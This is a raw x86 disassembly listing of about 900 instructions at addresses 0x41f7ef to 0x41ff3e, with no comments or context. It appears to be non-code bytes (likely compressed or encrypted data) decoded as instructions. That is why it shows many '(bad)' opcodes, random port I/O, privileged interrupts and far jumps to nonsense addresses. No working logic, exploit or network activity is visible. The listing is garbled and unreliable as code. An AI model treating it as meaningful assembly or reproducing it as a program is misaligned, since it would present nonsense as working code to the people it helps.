  41f7ef:	gs stc 
  41f7f1:	loop   0x41f831
  41f7f3:	test   BYTE PTR [ebx],bl
  41f7f5:	pop    ebp
  41f7f6:	mov    ecx,0x6c5197b0
  41f7fb:	popf   
  41f7fc:	int    0xcf
  41f7fe:	pop    ds
  41f7ff:	push   edi
  41f800:	and    al,0x15
  41f802:	mul    edx
  41f804:	adc    cl,dl
  41f806:	cmp    edx,DWORD PTR es:[eax]
  41f809:	sbb    esi,DWORD PTR [ebp+0x61abfea9]
  41f80f:	ror    BYTE PTR [ebx-0x41],cl
  41f812:	xor    DWORD PTR [edi],ecx
  41f814:	not    ch
  41f816:	imul   esp,ecx,0xa98e82f5
  41f81c:	ins    DWORD PTR es:[edi],dx
  41f81d:	and    eax,0x134c3d14
  41f822:	fwait
  41f823:	cmp    eax,0xb0c36588
  41f828:	mov    ch,ah
  41f82a:	data16 aaa 
  41f82c:	mov    edi,0xcfeb6e13
  41f831:	and    eax,0x8249d570
  41f836:	repz pop edx
  41f838:	mov    bh,0x5a
  41f83a:	(bad)  
  41f83b:	in     al,0xbc
  41f83d:	adc    al,0x70
  41f83f:	sub    al,0xb4
  41f841:	retf   
  41f842:	mov    WORD PTR [eax-0x59],gs
  41f845:	popa   
  41f846:	jmp    0x641970a8
  41f84b:	stos   DWORD PTR es:[edi],eax
  41f84c:	out    dx,al
  41f84d:	fcmovnbe st,st(6)
  41f84f:	nop
  41f850:	and    eax,0x8b69aa85
  41f855:	ins    DWORD PTR es:[di],dx
  41f857:	xchg   edi,eax
  41f858:	xor    DWORD PTR [edi+0x15ee4fdd],ebp
  41f85e:	xchg   esp,eax
  41f85f:	lahf   
  41f860:	sub    al,0xf2
  41f862:	addr16 repnz inc ebp
  41f865:	jl     0x41f8e5
  41f867:	mov    ecx,0xf0a98137
  41f86c:	xor    dh,BYTE PTR [edi+eiz*2-0x72]
  41f870:	ror    esp,cl
  41f872:	in     al,dx
  41f873:	sub    al,0x31
  41f875:	push   es
  41f876:	add    eax,0x85e5896e
  41f87b:	popa   
  41f87c:	xor    ah,dh
  41f87e:	pop    esi
  41f87f:	test   al,0x8d
  41f881:	outs   dx,BYTE PTR ds:[esi]
  41f882:	push   esi
  41f883:	mov    eax,0xa2b619e0
  41f888:	inc    eax
  41f889:	xchg   esi,eax
  41f88a:	cwde   
  41f88b:	or     al,0x66
  41f88d:	push   ebx
  41f88e:	fbld   TBYTE PTR [eax-0x5a]
  41f891:	mov    esp,DWORD PTR [edi-0x76]
  41f894:	adc    DWORD PTR [ebx],ebx
  41f896:	ror    BYTE PTR [ebp+0x168882f6],cl
  41f89c:	sbb    al,0x36
  41f89e:	pop    ss
  41f89f:	inc    edi
  41f8a0:	push   ecx
  41f8a1:	daa    
  41f8a2:	xor    dl,BYTE PTR ds:0x57f9998c
  41f8a8:	dec    esi
  41f8a9:	xor    eax,0x5c0cbb1c
  41f8ae:	jbe    0x41f863
  41f8b0:	jns    0x41f8bb
  41f8b2:	call   0x33fc462b
  41f8b7:	xchg   ebp,eax
  41f8b8:	sub    eax,0xaec5b730
  41f8bd:	jge    0x157cf8b9
  41f8c3:	xor    eax,0x6c562e66
  41f8c8:	and    ch,0x3d
  41f8cb:	mov    esi,0xda4c8b41
  41f8d0:	sub    esi,esp
  41f8d2:	outs   dx,BYTE PTR ds:[esi]
  41f8d3:	shr    DWORD PTR [esi+ebx*1],cl
  41f8d6:	pop    es
  41f8d7:	pushf  
  41f8d8:	sub    al,0xa1
  41f8da:	mov    esi,0x56543489
  41f8df:	jmp    0xe2e7:0xcd061293
  41f8e6:	dec    edi
  41f8e7:	and    DWORD PTR [esi],eax
  41f8e9:	imul   ebp,ecx,0xaaff53a6
  41f8ef:	and    dx,ax
  41f8f2:	mov    bl,0x4d
  41f8f4:	(bad)  
  41f8f6:	pop    esp
  41f8f7:	pop    ecx
  41f8f8:	int    0xd2
  41f8fa:	test   al,0x2a
  41f8fc:	and    bh,ah
  41f8fe:	(bad)  
  41f8ff:	aam    0x1b
  41f901:	mov    ah,0xe6
  41f903:	ds aas 
  41f905:	mov    ?,WORD PTR [esi+0x72]
  41f908:	stc    
  41f909:	jecxz  0x41f8bf
  41f90b:	xor    esi,esp
  41f90d:	mov    esi,ecx
  41f90f:	(bad)  
  41f910:	aas    
  41f911:	popf   
  41f912:	or     al,0x7
  41f914:	mov    al,0x12
  41f916:	mov    al,0x62
  41f918:	neg    eax
  41f91a:	and    eax,0x7b1bae22
  41f91f:	push   cs
  41f920:	fstp   TBYTE PTR [ecx+0x40dbbe85]
  41f926:	adc    BYTE PTR ds:0x429da1d9,0x61
  41f92d:	jnp    0x41f8f2
  41f92f:	leave  
  41f930:	dec    ecx
  41f931:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f932:	test   BYTE PTR [ebp+ebx*4-0x3b],bh
  41f936:	xchg   ebx,eax
  41f937:	stc    
  41f938:	loop   0x41f8dc
  41f93a:	mov    DWORD PTR [edx+0x58],edi
  41f93d:	mov    eax,0x9b4bcf2b
  41f942:	mov    edi,0x5dd6d876
  41f947:	fcom   QWORD PTR [ebx+0x2c0b45c9]
  41f94d:	jns    0x41f8d8
  41f94f:	pop    ecx
  41f950:	stc    
  41f951:	ret    
  41f952:	ja     0x41f946
  41f954:	bound  esp,QWORD PTR [ebp-0x5]
  41f957:	xchg   ecx,eax
  41f958:	stc    
  41f959:	ds test al,0x3f
  41f95c:	pop    eax
  41f95d:	js     0x41f94e
  41f95f:	pushf  
  41f960:	adc    DWORD PTR [ecx],0xffffffbd
  41f963:	inc    eax
  41f964:	sbb    BYTE PTR ds:0x5e476e6b,cl
  41f96a:	or     ebx,DWORD PTR [eax]
  41f96c:	(bad)  [eax]
  41f96e:	imul   ecx,esp,0xffffffb3
  41f971:	adc    BYTE PTR [ecx+0x32f7f804],dh
  41f977:	xchg   ebx,eax
  41f978:	dec    ebx
  41f979:	push   0xa466b99f
  41f97e:	imul   esi,esi,0xffffffd9
  41f981:	dec    esp
  41f982:	les    eax,FWORD PTR [ebx]
  41f984:	ret    
  41f985:	mov    dh,0x5e
  41f987:	out    dx,al
  41f988:	fisttp DWORD PTR [eax+0x15279e04]
  41f98e:	or     eax,0x6ff471f9
  41f993:	in     eax,dx
  41f994:	sbb    ch,BYTE PTR [ebp+0x42]
  41f997:	aam    0x75
  41f999:	or     eax,0xf2f916c4
  41f99e:	ja     0x41f9c1
  41f9a0:	push   ecx
  41f9a1:	popf   
  41f9a2:	ret    0xf417
  41f9a5:	jns    0x41f938
  41f9a7:	push   ebp
  41f9a8:	mov    ch,0xf6
  41f9aa:	in     eax,0xfd
  41f9ac:	sbb    ecx,ebx
  41f9ae:	mov    ebp,0x4f4b0a87
  41f9b3:	inc    ebp
  41f9b4:	pop    esp
  41f9b5:	shl    BYTE PTR [ecx-0x1d],0x11
  41f9b9:	xchg   esi,eax
  41f9ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9bb:	push   0xffffffca
  41f9bd:	scas   eax,DWORD PTR es:[edi]
  41f9be:	push   ebx
  41f9bf:	aas    
  41f9c0:	cmp    eax,0xd4249a90
  41f9c5:	xor    DWORD PTR [edi-0x5161c7a0],ebp
  41f9cb:	sub    DWORD PTR [ebx+edx*2-0x7a],esp
  41f9cf:	jge    0x41fa0a
  41f9d1:	loope  0x41fa20
  41f9d3:	scas   al,BYTE PTR es:[edi]
  41f9d4:	xor    al,0xae
  41f9d6:	mov    bl,0x61
  41f9d8:	mov    dl,0xc8
  41f9da:	jb     0x41f9d6
  41f9dc:	dec    esp
  41f9dd:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f9df:	sub    eax,0xaa1edf9
  41f9e4:	push   ds
  41f9e5:	mov    ds:0x8fdd63af,eax
  41f9ea:	outs   dx,DWORD PTR ds:[esi]
  41f9eb:	sbb    eax,0xdcfea3aa
  41f9f0:	stos   BYTE PTR es:[edi],al
  41f9f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9f2:	jp     0x41f9bd
  41f9f4:	xchg   DWORD PTR [eax-0x6a],edx
  41f9f7:	pop    edi
  41f9f8:	retf   
  41f9f9:	inc    BYTE PTR [ebp+0x4c519211]
  41f9ff:	adc    eax,0xab388f5e
  41fa05:	push   0x57
  41fa07:	and    eax,ebp
  41fa09:	out    dx,al
  41fa0a:	and    al,0x79
  41fa0c:	addr16 dec ebx
  41fa0e:	in     eax,dx
  41fa0f:	fs stos DWORD PTR es:[edi],eax
  41fa11:	xor    BYTE PTR [edi+0x45bab8af],0x7d
  41fa18:	pop    edx
  41fa19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa1a:	jb     0x41fa15
  41fa1c:	mov    ecx,0x980555c4
  41fa21:	fwait
  41fa22:	adc    ch,BYTE PTR [ebp-0xf]
  41fa25:	push   ebx
  41fa26:	in     al,0x1a
  41fa28:	mov    ch,0x50
  41fa2a:	inc    esp
  41fa2b:	loopne 0x41fa85
  41fa2d:	add    BYTE PTR [ecx],ah
  41fa2f:	cmp    al,bl
  41fa31:	pop    ebx
  41fa32:	ror    DWORD PTR [edi+0x75798f57],cl
  41fa38:	shl    al,1
  41fa3a:	adc    BYTE PTR [edi-0x3e],0xfd
  41fa3e:	adc    BYTE PTR [edi+eiz*1],cl
  41fa41:	cli    
  41fa42:	imul   ecx,DWORD PTR ds:0x7fc25cac,0x31
  41fa49:	push   es
  41fa4a:	sub    BYTE PTR ds:0x933b625,dh
  41fa50:	sbb    eax,0xb5b64c91
  41fa55:	arpl   sp,cx
  41fa57:	jge    0x41fa8a
  41fa59:	(bad)  
  41fa5a:	addr16 loope 0x41fa28
  41fa5d:	push   eax
  41fa5e:	inc    ecx
  41fa5f:	xor    BYTE PTR [esi],ah
  41fa61:	in     eax,0x62
  41fa63:	outs   dx,DWORD PTR ds:[esi]
  41fa64:	push   0x4ccdd995
  41fa69:	sub    eax,0xb9e3af2c
  41fa6e:	sti    
  41fa6f:	jns    0x41fa31
  41fa71:	ja     0x41fae6
  41fa73:	mov    BYTE PTR [edi],dl
  41fa75:	sbb    eax,0xd72bd7f4
  41fa7a:	stc    
  41fa7b:	add    BYTE PTR [ecx+0x678653b8],dh
  41fa81:	lock aam 0x5b
  41fa84:	jecxz  0x41fa70
  41fa86:	fwait
  41fa87:	xor    BYTE PTR [ebx-0x9950bea],ch
  41fa8d:	sub    DWORD PTR [ebp+0x6f],esp
  41fa90:	pushf  
  41fa91:	daa    
  41fa92:	in     eax,0x8
  41fa94:	imul   DWORD PTR [eax+ebx*4-0x4a]
  41fa98:	mov    al,ds:0x68c6614b
  41fa9d:	leave  
  41fa9e:	into   
  41fa9f:	int    0xdb
  41faa1:	add    DWORD PTR [ecx+eax*8],ecx
  41faa4:	mov    ecx,0xbaa7ee10
  41faa9:	xor    BYTE PTR [edx],bh
  41faab:	adc    BYTE PTR [edx-0x5],bl
  41faae:	(bad)  
  41faaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fab0:	int    0x2b
  41fab2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fab3:	repz icebp 
  41fab5:	dec    esi
  41fab6:	jnp    0x41fa47
  41fab8:	rep lods eax,DWORD PTR ds:[esi]
  41faba:	call   0x8d26:0x982db9a
  41fac1:	rcl    BYTE PTR [edi+0x77f74647],0xa9
  41fac8:	cli    
  41fac9:	or     esp,DWORD PTR [edi]
  41facb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41facc:	loopne 0x41fb3f
  41face:	jne    0x41fb47
  41fad0:	(bad)  
  41fad1:	sub    ebx,ecx
  41fad3:	in     al,dx
  41fad4:	and    BYTE PTR [edx],bh
  41fad6:	das    
  41fad7:	retf   
  41fad8:	pop    ss
  41fad9:	xor    ebp,DWORD PTR [eax+0x6c]
  41fadc:	dec    esi
  41fadd:	scas   eax,DWORD PTR es:[edi]
  41fade:	adc    DWORD PTR [eax+0x7ad290bc],ecx
  41fae4:	addr16 add cl,ch
  41fae7:	xor    ecx,ebp
  41fae9:	dec    ebp
  41faea:	dec    ebx
  41faeb:	mov    bl,0x6
  41faed:	mov    DWORD PTR [eax+0x933ec58],edx
  41faf3:	xlat   BYTE PTR ds:[ebx]
  41faf4:	pmulhuw mm7,QWORD PTR [esi]
  41faf7:	outs   dx,DWORD PTR ds:[esi]
  41faf8:	mov    dh,0xc3
  41fafa:	retf   0xe61d
  41fafd:	mov    eax,0x5071582f
  41fb02:	scas   eax,DWORD PTR es:[edi]
  41fb03:	mov    al,0x4c
  41fb05:	in     al,dx
  41fb06:	jne    0x41fb70
  41fb08:	adc    BYTE PTR [ebp+0x1e],bl
  41fb0b:	pop    ecx
  41fb0c:	xchg   DWORD PTR [ecx],ecx
  41fb0e:	in     eax,dx
  41fb0f:	rcl    BYTE PTR [esi],cl
  41fb11:	outs   dx,DWORD PTR ds:[esi]
  41fb12:	out    dx,eax
  41fb13:	add    al,0x56
  41fb15:	call   0x955a:0x9343ffbb
  41fb1c:	outs   dx,BYTE PTR ds:[esi]
  41fb1d:	scas   al,BYTE PTR es:[edi]
  41fb1e:	xchg   ebp,eax
  41fb1f:	pop    ss
  41fb20:	dec    eax
  41fb21:	rcr    BYTE PTR [esi+0x6bc75122],cl
  41fb27:	push   edx
  41fb28:	je     0x41fafa
  41fb2a:	push   0x432e0386
  41fb2f:	mov    ah,0x1d
  41fb31:	fild   QWORD PTR [ebp+0x17]
  41fb34:	aad    0xc4
  41fb36:	inc    esi
  41fb37:	inc    eax
  41fb38:	pop    ecx
  41fb39:	dec    esi
  41fb3a:	retf   0xf6f5
  41fb3d:	mov    eax,ds:0xa9096969
  41fb42:	in     al,0xc4
  41fb44:	js     0x41fb95
  41fb46:	push   ecx
  41fb47:	dec    esi
  41fb48:	mov    al,0x4f
  41fb4a:	cli    
  41fb4b:	enter  0x7bd,0x6d
  41fb4f:	test   eax,0xb49e7b8d
  41fb54:	les    edi,FWORD PTR [esi+0x3a]
  41fb57:	(bad)  
  41fb59:	mov    al,ds:0x114efc87
  41fb5e:	sbb    eax,0xdba9ab74
  41fb63:	inc    eax
  41fb64:	and    edi,DWORD PTR [edi-0x12]
  41fb67:	(bad)  
  41fb68:	fdivr  QWORD PTR ds:0x497c1ab0
  41fb6e:	out    0x4a,eax
  41fb70:	or     BYTE PTR [eax],ah
  41fb72:	xchg   DWORD PTR [ebx-0x26],edx
  41fb75:	xchg   BYTE PTR [edx],ch
  41fb77:	addr16 je 0x41fbb4
  41fb7a:	fstp   st(6)
  41fb7c:	sbb    ecx,DWORD PTR [eax]
  41fb7e:	add    edi,ebx
  41fb80:	shl    BYTE PTR [eax],1
  41fb82:	xchg   BYTE PTR [eax],dl
  41fb84:	jae    0x41fba5
  41fb86:	sub    al,0x24
  41fb88:	inc    ecx
  41fb89:	fstp   TBYTE PTR gs:[eax+0x34]
  41fb8d:	push   ecx
  41fb8e:	sbb    al,0xc4
  41fb90:	ret    
  41fb91:	into   
  41fb92:	xor    al,0x8b
  41fb94:	aad    0x39
  41fb96:	icebp  
  41fb97:	mov    esi,DWORD PTR fs:[edx+0x10]
  41fb9b:	jns    0x41fc12
  41fb9d:	pop    ebp
  41fb9e:	xchg   DWORD PTR [edx-0x3d808e33],eax
  41fba4:	inc    esp
  41fba5:	ins    BYTE PTR es:[edi],dx
  41fba6:	(bad)  
  41fba7:	cld    
  41fba8:	or     ebx,edi
  41fbaa:	xor    al,al
  41fbac:	and    DWORD PTR [esi+0x31d07dde],0x8d64d76a
  41fbb6:	iret   
  41fbb7:	dec    dx
  41fbb9:	sub    ch,BYTE PTR [edi-0x21]
  41fbbc:	pushf  
  41fbbd:	mov    ecx,0xef963a91
  41fbc2:	adc    BYTE PTR [edx-0x396fe723],ch
  41fbc8:	sub    edx,ebp
  41fbca:	and    al,0xa
  41fbcc:	icebp  
  41fbcd:	setne  BYTE PTR [esi-0x2d01e467]
  41fbd4:	xor    BYTE PTR [ebp+ebx*4-0x59467493],ah
  41fbdb:	add    eax,0xf100c012
  41fbe0:	inc    ebx
  41fbe1:	call   0x31d0214f
  41fbe6:	lea    esp,[edi-0x38fc53c]
  41fbec:	inc    ebx
  41fbed:	(bad)  
  41fbee:	jp     0x41fb9e
  41fbf0:	not    BYTE PTR [ecx+0x77721f97]
  41fbf6:	sub    edx,DWORD PTR [edi]
  41fbf8:	pmullw mm2,QWORD PTR [ebp+0x65e4c584]
  41fbff:	int    0xd2
  41fc01:	stc    
  41fc02:	pop    esi
  41fc03:	jg     0x41fc53
  41fc05:	pop    edx
  41fc06:	rcl    DWORD PTR [edx-0x53],cl
  41fc09:	fld    TBYTE PTR [ebx]
  41fc0b:	(bad)  
  41fc0c:	xchg   ebp,eax
  41fc0d:	sub    DWORD PTR [edi+eiz*1+0x33da7b67],ecx
  41fc14:	sbb    eax,0x9d586a67
  41fc19:	mov    ch,0x99
  41fc1b:	outs   dx,BYTE PTR ds:[esi]
  41fc1c:	push   ebx
  41fc1d:	shr    DWORD PTR [eax-0x76],0xe9
  41fc21:	cmp    BYTE PTR [edi-0xa],bl
  41fc24:	push   es
  41fc25:	adc    BYTE PTR [ecx+0x126a2aa3],ch
  41fc2b:	push   edx
  41fc2c:	pop    ebx
  41fc2d:	fidiv  DWORD PTR [eax+eax*2+0x4daed810]
  41fc34:	mov    ch,BYTE PTR [edi-0x1eb8f5c4]
  41fc3a:	xchg   esp,eax
  41fc3b:	fstp   TBYTE PTR [ecx+ebp*8]
  41fc3e:	std    
  41fc3f:	or     eax,DWORD PTR [ebp-0x7c5e1302]
  41fc45:	pop    edi
  41fc46:	pushf  
  41fc47:	mov    cl,0x7c
  41fc49:	jo     0x41fbef
  41fc4b:	fscale 
  41fc4d:	inc    edi
  41fc4e:	jp     0x41fc92
  41fc50:	int3   
  41fc51:	stos   BYTE PTR es:[edi],al
  41fc52:	xchg   ebp,eax
  41fc53:	sbb    ebx,DWORD PTR [edx+0x556a31b8]
  41fc59:	imul   edx,DWORD PTR [edi+0x75],0xc09ae43b
  41fc60:	inc    ebp
  41fc61:	enter  0xdc03,0xd7
  41fc65:	pop    es
  41fc66:	mov    gs:0x9ab84b0d,eax
  41fc6c:	and    BYTE PTR [eax],bl
  41fc6e:	ret    
  41fc6f:	mov    edx,0xa85e8a98
  41fc74:	(bad)  
  41fc75:	and    BYTE PTR [ebp+0x24d21fdb],cl
  41fc7b:	add    bh,bh
  41fc7d:	mov    dh,0x80
  41fc7f:	pop    esp
  41fc80:	fcom   DWORD PTR [ebp-0x1a]
  41fc83:	aaa    
  41fc84:	hlt    
  41fc85:	rcr    BYTE PTR [edx-0x6f8133e3],cl
  41fc8b:	mov    al,0xa5
  41fc8d:	cmp    al,0xce
  41fc8f:	cmovl  ecx,DWORD PTR [ebp-0x37bab3ba]
  41fc96:	push   es
  41fc97:	and    eax,0x43f94dfd
  41fc9c:	pop    esp
  41fc9d:	xor    eax,0x48126036
  41fca2:	arpl   WORD PTR [esi+0x6b],ax
  41fca5:	test   al,0x51
  41fca7:	adc    BYTE PTR [esi+eiz*1-0x38],bh
  41fcab:	inc    ebx
  41fcac:	mov    ecx,0x840aa9b5
  41fcb1:	ins    BYTE PTR es:[edi],dx
  41fcb2:	mov    eax,ds:0xad4578f2
  41fcb7:	or     bh,BYTE PTR [edx+0x22]
  41fcba:	add    al,0x70
  41fcbc:	lods   eax,DWORD PTR ds:[esi]
  41fcbd:	into   
  41fcbe:	add    cl,BYTE PTR [ecx]
  41fcc0:	test   esi,edi
  41fcc2:	sub    ebp,DWORD PTR [edx+0x37511564]
  41fcc8:	imul   ebx,DWORD PTR [ebx],0x6e2088f2
  41fcce:	cmp    al,0xcc
  41fcd0:	pop    ss
  41fcd1:	inc    eax
  41fcd2:	push   cs
  41fcd3:	mov    al,ds:0x874ff7dd
  41fcd8:	outs   dx,BYTE PTR ds:[esi]
  41fcd9:	aas    
  41fcda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcdb:	mov    ah,0x19
  41fcdd:	(bad)  
  41fcde:	mov    ds:0xb0c8b98d,eax
  41fce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fce4:	mov    al,0xba
  41fce6:	mov    cl,0xd1
  41fce8:	daa    
  41fce9:	mov    al,0xec
  41fceb:	pop    esi
  41fcec:	xchg   ebx,eax
  41fced:	ror    DWORD PTR [ecx-0x34],0xb9
  41fcf1:	sub    DWORD PTR ds:0xd7ff973d,eax
  41fcf7:	sbb    DWORD PTR [edx],edx
  41fcf9:	or     ebx,DWORD PTR [ecx+0x39]
  41fcfc:	sub    BYTE PTR [edi],dh
  41fcfe:	inc    esi
  41fcff:	jnp    0x41fd29
  41fd01:	jae    0x41fd07
  41fd03:	xor    al,0xa6
  41fd05:	sub    DWORD PTR [eax],edx
  41fd07:	mov    esp,0x9ab97d91
  41fd0c:	loopne 0x41fcc1
  41fd0e:	and    DWORD PTR [edi],esp
  41fd10:	or     bh,BYTE PTR ds:0x77c334e4
  41fd16:	inc    esi
  41fd17:	test   BYTE PTR [ebx-0x59d95c9d],bh
  41fd1d:	rcl    BYTE PTR [edi+eiz*1+0x6f4bcc19],cl
  41fd24:	shl    DWORD PTR [esi-0x78],0x69
  41fd28:	pop    es
  41fd29:	xor    esp,DWORD PTR [ecx-0x58]
  41fd2c:	jns    0x41fd0d
  41fd2e:	push   ecx
  41fd2f:	mov    ch,0xe9
  41fd31:	fist   DWORD PTR [edx+0x3fc12945]
  41fd37:	and    DWORD PTR [edx],ebx
  41fd39:	cli    
  41fd3a:	ret    
  41fd3b:	mov    ah,0xad
  41fd3d:	call   0x14bf:0xac808f13
  41fd44:	push   cs
  41fd45:	sbb    al,al
  41fd47:	mov    DWORD PTR [esi-0x30],edx
  41fd4a:	fild   WORD PTR [edi+0x51e633e6]
  41fd50:	xchg   ecx,eax
  41fd51:	icebp  
  41fd52:	and    al,0x8f
  41fd54:	mov    esi,0x3c5839fe
  41fd59:	xor    BYTE PTR [edi],0x9e
  41fd5c:	fwait
  41fd5d:	pop    es
  41fd5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd5f:	inc    esp
  41fd60:	mov    dl,0xf
  41fd62:	xchg   edx,eax
  41fd63:	and    esp,DWORD PTR [ecx-0x18]
  41fd66:	icebp  
  41fd67:	test   DWORD PTR [ebx-0x1d],ebx
  41fd6a:	lds    eax,FWORD PTR [edi+0x3bac3c30]
  41fd70:	sbb    al,0xfe
  41fd72:	xchg   esi,eax
  41fd73:	ins    BYTE PTR es:[edi],dx
  41fd74:	mov    BYTE PTR [ecx],bh
  41fd76:	push   DWORD PTR [ecx+0x349889ac]
  41fd7c:	inc    ebx
  41fd7d:	xchg   ecx,eax
  41fd7e:	push   edi
  41fd7f:	and    eax,0xd76ede04
  41fd84:	dec    ebp
  41fd85:	add    BYTE PTR [edx-0x80],cl
  41fd88:	inc    edi
  41fd89:	pop    ebp
  41fd8a:	and    ch,BYTE PTR [ecx+0x3092130d]
  41fd90:	gs sub al,0x97
  41fd93:	mov    DWORD PTR [ebp-0x67],0x9ed80f53
  41fd9a:	mov    ebx,DWORD PTR [ebx-0x3d]
  41fd9d:	inc    edx
  41fd9e:	xor    BYTE PTR [ebp+edx*2-0x4252612a],dl
  41fda5:	mov    al,ds:0xced474dc
  41fdaa:	sub    DWORD PTR [edx+edi*2+0x62],edi
  41fdae:	adc    DWORD PTR [ebx],0x16
  41fdb1:	sub    DWORD PTR ds:0x202699b3,ecx
  41fdb7:	cwde   
  41fdb8:	test   BYTE PTR [ebx-0x243256a1],cl
  41fdbe:	mov    dh,BYTE PTR [edi]
  41fdc0:	adc    al,0xcd
  41fdc2:	dec    edi
  41fdc3:	cwde   
  41fdc4:	and    DWORD PTR [ebx-0x544c1ab0],0xffffffca
  41fdcb:	retf   
  41fdcc:	jg     0x41fe17
  41fdce:	popf   
  41fdcf:	sub    ch,dh
  41fdd1:	sbb    esp,edx
  41fdd3:	daa    
  41fdd4:	add    BYTE PTR [ebp+eax*2-0x569675da],ah
  41fddb:	cmp    eax,0xfd67a3ad
  41fde0:	xchg   edi,eax
  41fde1:	mov    al,0x9b
  41fde3:	cmp    eax,0x66e05997
  41fde8:	nop
  41fde9:	sbb    eax,edx
  41fdeb:	mov    esi,0xa02dccf3
  41fdf0:	(bad)  
  41fdf1:	sbb    DWORD PTR [edi],esi
  41fdf3:	fcom   QWORD PTR [edx]
  41fdf5:	nop
  41fdf6:	xchg   ebp,eax
  41fdf7:	shl    BYTE PTR [esi+edi*2-0x677cb2e2],0xa3
  41fdff:	xchg   ch,ah
  41fe01:	adc    dh,BYTE PTR [esi]
  41fe03:	push   ebp
  41fe04:	clc    
  41fe05:	jbe    0x41fe10
  41fe07:	inc    esp
  41fe08:	out    dx,eax
  41fe09:	int3   
  41fe0a:	push   esi
  41fe0b:	in     eax,dx
  41fe0c:	(bad)  
  41fe0d:	lods   al,BYTE PTR ds:[esi]
  41fe0e:	popa   
  41fe0f:	std    
  41fe10:	xchg   esi,eax
  41fe11:	jne    0x41fdf7
  41fe13:	push   0xf0144f84
  41fe18:	rcr    BYTE PTR [esp+eax*8+0x4d578b7d],cl
  41fe1f:	mov    eax,0x4c81ca74
  41fe24:	pop    edx
  41fe25:	xchg   DWORD PTR [esi-0x6f5888eb],ecx
  41fe2b:	sbb    al,0x41
  41fe2d:	fst    QWORD PTR [edi-0x46]
  41fe30:	out    dx,eax
  41fe31:	(bad)  
  41fe32:	sub    ebx,ebp
  41fe34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe35:	or     eax,0xd0bcbec9
  41fe3a:	jae    0x41fe4a
  41fe3c:	xchg   edi,eax
  41fe3d:	loopne 0x41fe53
  41fe3f:	mov    gs,ebp
  41fe41:	cmp    al,0x2a
  41fe43:	popa   
  41fe44:	dec    ecx
  41fe45:	cmp    edx,edx
  41fe47:	sbb    ebx,DWORD PTR [edi+eiz*4]
  41fe4a:	out    0xf3,al
  41fe4c:	dec    edx
  41fe4d:	inc    eax
  41fe4e:	fild   QWORD PTR [edi-0x6ab5137f]
  41fe54:	cmp    eax,0x247843b6
  41fe59:	xchg   BYTE PTR [edx+0x51b98bd3],dh
  41fe5f:	inc    ecx
  41fe60:	mov    eax,ds:0x8f53ac71
  41fe65:	lahf   
  41fe66:	adc    dh,al
  41fe68:	imul   edx,DWORD PTR [esp+edi*2-0x4187d5fc],0xffffff9b
  41fe70:	ja     0x41fe15
  41fe72:	mov    ah,0x1a
  41fe74:	scas   eax,DWORD PTR es:[edi]
  41fe75:	loop   0x41fea8
  41fe77:	fst    QWORD PTR [ecx+0x78c95e90]
  41fe7d:	mov    fs,edx
  41fe7f:	pop    es
  41fe80:	mov    ebx,0xe81ce9d7
  41fe85:	bound  eax,QWORD PTR [ebx-0x37f0b42e]
  41fe8b:	lock pop es
  41fe8d:	adc    bl,ch
  41fe8f:	clc    
  41fe90:	scas   al,BYTE PTR es:[edi]
  41fe91:	adc    ebx,ebx
  41fe93:	cli    
  41fe94:	push   ss
  41fe95:	out    dx,al
  41fe96:	jbe    0x41feaa
  41fe98:	stc    
  41fe99:	mov    ebx,0x1227555a
  41fe9e:	sbb    dh,BYTE PTR [edx]
  41fea0:	test   al,0x45
  41fea2:	repz ds mov esi,0x4c4fdfdd
  41fea9:	mov    edx,0x481f16da
  41feae:	retf   
  41feaf:	sbb    dl,BYTE PTR [edx-0x7a]
  41feb2:	arpl   WORD PTR [esi],cx
  41feb4:	inc    ebp
  41feb5:	inc    ebx
  41feb6:	sbb    DWORD PTR [ebx-0x77d8eca8],esp
  41febc:	aam    0x5f
  41febe:	test   DWORD PTR [eax-0x30b62b86],0xe514f60b
  41fec8:	sbb    dh,BYTE PTR [di]
  41fecb:	pop    ss
  41fecc:	and    ecx,DWORD PTR [ebp+0x62]
  41fecf:	push   0x67ad1964
  41fed4:	ds mov es,edi
  41fed7:	xor    bl,BYTE PTR ds:[ebx]
  41feda:	and    DWORD PTR [esi+eiz*4+0x77],eax
  41fede:	pop    ds
  41fedf:	pop    eax
  41fee0:	adc    BYTE PTR [ebx+0x16e413ed],cl
  41fee6:	mov    esp,0xdfe0a8eb
  41feeb:	push   ecx
  41feec:	into   
  41feed:	add    ecx,DWORD PTR [ebx-0x40119ced]
  41fef3:	mov    eax,0x3e2d82ca
  41fef8:	or     eax,0xeeaa31f
  41fefd:	adc    ebp,ecx
  41feff:	outs   dx,BYTE PTR ds:[esi]
  41ff00:	pop    ds
  41ff01:	push   eax
  41ff02:	inc    ebx
  41ff03:	pop    fs
  41ff05:	jge    0x41ff84
  41ff07:	mov    ebp,0xe2bf6904
  41ff0c:	pop    edi
  41ff0d:	aad    0xbd
  41ff0f:	push   ebp
  41ff10:	inc    eax
  41ff11:	jbe    0x41fec4
  41ff13:	jb     0x41ff91
  41ff15:	mov    bh,0xf0
  41ff17:	sbb    DWORD PTR [edi-0x78],0x48
  41ff1b:	fs inc ecx
  41ff1d:	inc    esp
  41ff1e:	ret    
  41ff1f:	ins    BYTE PTR es:[edi],dx
  41ff20:	or     esp,edi
  41ff22:	xchg   edi,eax
  41ff23:	add    ecx,DWORD PTR [edi]
  41ff25:	scas   al,BYTE PTR es:[edi]
  41ff26:	cmp    al,0x3b
  41ff28:	neg    DWORD PTR [esp+eax*1-0x16]
  41ff2c:	out    0xab,al
  41ff2e:	test   eax,0xb1b3d0c8
  41ff33:	loop   0x41ff05
  41ff35:	add    edx,DWORD PTR [edi]
  41ff37:	adc    ecx,ebp
  41ff39:	clc    
  41ff3a:	loopne 0x41ffaa
  41ff3c:	(bad)  
  41ff3d:	xchg   esp,eax
  41ff3e:	xchg   ebx,eax
